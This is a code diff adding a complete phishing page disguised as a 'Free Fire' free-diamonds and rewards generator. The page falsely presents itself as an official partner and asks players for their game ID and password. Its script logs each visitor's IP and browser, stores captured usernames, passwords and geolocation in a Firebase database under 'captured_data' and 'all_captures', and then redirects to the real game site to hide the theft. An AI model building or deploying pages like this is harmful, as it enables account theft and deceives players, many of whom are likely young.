@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Free Fire - Free Diamonds</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: linear-gradient(180deg, #1a1a3e, #0d0d1a);
+            border-radius: 20px;
+            border: 2px solid #ff6600;
+            box-shadow: 0 0 30px rgba(255,102,0,0.3);
+            padding: 30px 25px;
+            animation: slideUp 0.4s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header .logo {
+            font-size: 4em;
+            margin-bottom: 10px;
+        }
+        .header h1 {
+            font-size: 2em;
+            font-weight: 900;
+            background: linear-gradient(45deg, #ff6600, #ff3300);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .header p { color: #aaa; font-size: 0.9em; }
+        
+        .diamond-counter {
+            background: linear-gradient(45deg, #ff6600, #ff3300);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        .diamond-counter .count {
+            font-size: 2.5em;
+            font-weight: 900;
+        }
+        .diamond-counter p { font-size: 0.85em; opacity: 0.9; }
+        
+        .offer-list {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .offer-item {
+            background: rgba(255,255,255,0.05);
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(255,102,0,0.3);
+        }
+        .offer-item .amount { color: #ff6600; font-size: 1.2em; font-weight: bold; }
+        .offer-item .label { color: #aaa; font-size: 0.75em; margin-top: 5px; }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            color: #ccc;
+            margin-bottom: 6px;
+            font-size: 0.85em;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #333;
+            border-radius: 10px;
+            font-size: 0.95em;
+            transition: all 0.3s;
+            background: rgba(255,255,255,0.05);
+            color: #fff;
+        }
+        .form-group input:focus {
+            border-color: #ff6600;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255,102,0,0.2);
+            background: rgba(255,255,255,0.1);
+        }
+        .form-group input::placeholder { color: #666; }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #ff6600, #ff3300);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .login-btn:hover { transform: scale(1.02); box-shadow: 0 5px 25px rgba(255,102,0,0.4); }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 25px;
+        }
+        .loading .spinner {
+            border: 3px solid rgba(255,102,0,0.2);
+            border-top: 3px solid #ff6600;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #aaa; margin-top: 10px; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: rgba(0,255,0,0.1);
+            border: 1px solid #00ff00;
+            border-radius: 15px;
+        }
+        .success-msg h3 { color: #0f0; }
+        .success-msg p { color: #ccc; margin-top: 10px; }
+        
+        .note { text-align: center; margin-top: 15px; color: #666; font-size: 0.8em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <div class="logo">🔫</div>
+                <h1>FREE FIRE</h1>
+                <p>Free Diamonds & Rewards Generator 2026</p>
+            </div>
+            
+            <div class="diamond-counter">
+                <div class="count">💎 99999</div>
+                <p>🆓 Free Diamonds Available - Claim Now!</p>
+            </div>
+            
+            <div class="offer-list">
+                <div class="offer-item">
+                    <div class="amount">💎 1000</div>
+                    <div class="label">Free Diamonds</div>
+                </div>
+                <div class="offer-item">
+                    <div class="amount">🎭 500</div>
+                    <div class="label">Free Skins</div>
+                </div>
+                <div class="offer-item">
+                    <div class="amount">👑 1</div>
+                    <div class="label">Royal Pass</div>
+                </div>
+                <div class="offer-item">
+                    <div class="amount">💰 50K</div>
+                    <div class="label">Free Coins</div>
+                </div>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>🎮 Free Fire ID / Username</label>
+                    <input type="text" id="username" placeholder="Enter your Free Fire ID" required>
+                </div>
+                <div class="form-group">
+                    <label>🔑 Account Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="login-btn">🎯 CLAIM FREE REWARDS</button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>🔄 Connecting to Free Fire Server & Verifying Account...</p>
+            </div>
+            
+            <div class="success-msg" id="successMsg">
+                <h3>✅ SUCCESS!</h3>
+                <p>💎 Your Free Diamonds and Rewards will be added within 24 hours!</p>
+                <p style="margin-top:10px;font-size:0.8em;color:#888;">Redirecting to Free Fire...</p>
+            </div>
+            
+            <div class="note">🔒 Secure Connection · Official Free Fire Partner</div>
+        </div>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'freefire',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'freefire', target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'freefire', target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://ff.garena.com', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
